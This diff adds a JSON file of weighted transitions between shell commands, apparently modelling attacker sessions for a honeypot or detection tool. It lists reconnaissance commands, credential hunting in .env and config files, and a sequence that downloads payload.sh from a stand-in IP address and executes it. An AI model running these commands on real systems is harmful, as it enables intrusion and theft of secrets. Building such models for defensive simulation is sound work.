@@ -1,0 +1,82 @@
+{
+  "transitions": {
+    "<start>": {
+      "whoami": 5,
+      "uname -a": 5,
+      "cd /tmp": 5,
+      "ls": 5
+    },
+    "whoami": {
+      "pwd": 5
+    },
+    "pwd": {
+      "ls -la": 5
+    },
+    "ls -la": {
+      "cat .env": 5
+    },
+    "uname -a": {
+      "id": 5
+    },
+    "id": {
+      "ps aux": 5
+    },
+    "ps aux": {
+      "netstat -tulpn": 5
+    },
+    "cd /tmp": {
+      "wget http://198.51.100.7/payload.sh": 5
+    },
+    "wget http://198.51.100.7/payload.sh": {
+      "chmod +x payload.sh": 5
+    },
+    "chmod +x payload.sh": {
+      "./payload.sh": 5
+    },
+    "ls": {
+      "cat config.php": 5
+    },
+    "cat config.php": {
+      "mysql -u root -p": 1,
+      "find / -name '*.env'": 4
+    },
+    "mysql -u root -p": {
+      "exit": 1
+    },
+    "cat .env": {
+      "exit": 4
+    },
+    "netstat -tulpn": {
+      "exit": 4
+    },
+    "./payload.sh": {
+      "exit": 4
+    },
+    "find / -name '*.env'": {
+      "grep -R password /var/www/html": 4
+    },
+    "grep -R password /var/www/html": {
+      "exit": 4
+    }
+  },
+  "defaults": {
+    "whoami": 5,
+    "pwd": 5,
+    "ls -la": 5,
+    "cat .env": 5,
+    "uname -a": 5,
+    "id": 5,
+    "ps aux": 5,
+    "netstat -tulpn": 5,
+    "cd /tmp": 5,
+    "wget http://198.51.100.7/payload.sh": 5,
+    "chmod +x payload.sh": 5,
+    "./payload.sh": 5,
+    "ls": 5,
+    "cat config.php": 5,
+    "mysql -u root -p": 1,
+    "exit": 17,
+    "find / -name '*.env'": 4,
+    "grep -R password /var/www/html": 4
+  }
+}
